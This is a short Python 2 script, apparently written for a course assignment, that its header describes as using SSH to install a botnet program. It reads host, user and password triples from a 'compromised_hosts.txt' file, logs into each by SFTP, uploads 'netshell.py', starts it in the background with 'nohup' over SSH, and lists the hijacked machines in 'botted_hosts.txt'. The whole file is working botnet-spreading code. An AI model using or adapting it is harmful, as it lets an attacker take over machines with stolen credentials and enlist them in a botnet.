#!/usr/bin/python2
# By: Brandon Cocanig
# Date due: 3/04/2019 11:59:59
# about: uses ssh to install the botnet program
import pexpect
import sys

# assume compromised_hosts.txt is in the right place

# get num of lines, becuae num of lines = the amount of hosts to try
num_lines = sum(1 for line in open('compromised_hosts.txt'))
print "reading compromised_hosts.txt", "found", num_lines ,"possible addresses, trying...."
print "------"


#push file into a list
compromised_hosts = []
workinghosts = []

with open('compromised_hosts.txt') as f:
    compromised_hosts = f.read().split()
    f.close()

add = 0 # used to add each host user password to the next offset
for i in range(num_lines):


    # GRAB THE CORRECT VARS HERE, i know its not "good" but it does work...
    host = compromised_hosts[0+add]
    user = compromised_hosts[1+add]
    password = compromised_hosts[2+add]
    add = add+3

    print "executing command", "sftp", user, "@", host, "with password:", password
    connStr = 'sftp' +' ' + user + '@' + host
    print [connStr]
    child = pexpect.spawn(connStr)


    # first loop checks if host works, secound if loop checks if password is good
    # if the host + password work it will upload the file and add it to the working host list
    # otherwise it will move to the next
    ret = child.expect(['password:', 'closed', pexpect.EOF, pexpect.TIMEOUT])

    if ret == 0:
        child.sendline(password)

        # expect the login prompt
        ret = child.expect(['sftp', 'try'])

        # Treats input data as reading from a file.

        if ret == 0: # mark this host user pass, as working and add the file
            print "script uploading"
            child.sendline("put netshell.py")

            child.sendline("bye")
            #child.kill(0)

            # use ssh to run the script
            connStr = 'ssh' +' ' + user + '@' + host
            child = pexpect.spawn(connStr)

            ret = child.expect(["password:", pexpect.EOF])
            if ret == 1:
                print "error starting shell"

            if ret == 0:
                child.sendline(password)

                ret = child.expect(['\$'])
                if ret == 0:
                    child.sendline("nohup ./netshell.py &")
                    child.sendline("logout")
                    ret = child.expect(["closed"])
                    #child.kill(0)

                    print "shell started"
                    print "------"
                    workinghosts.append(host)

        elif ret == 1:
            print "Unable to connect due to password", user, "@", host, "host down"
            print "------"

    elif ret == 1 or ret == 2 or ret == 3:
        print "host down /connection error", user, "@", host, "host down"
        print "------"


with open("botted_hosts.txt", 'w') as f:
    for item in workinghosts:
        f.write("%s\n" % item)

print "botted_hosts.txt was written and all working hosts were added to list,", workinghosts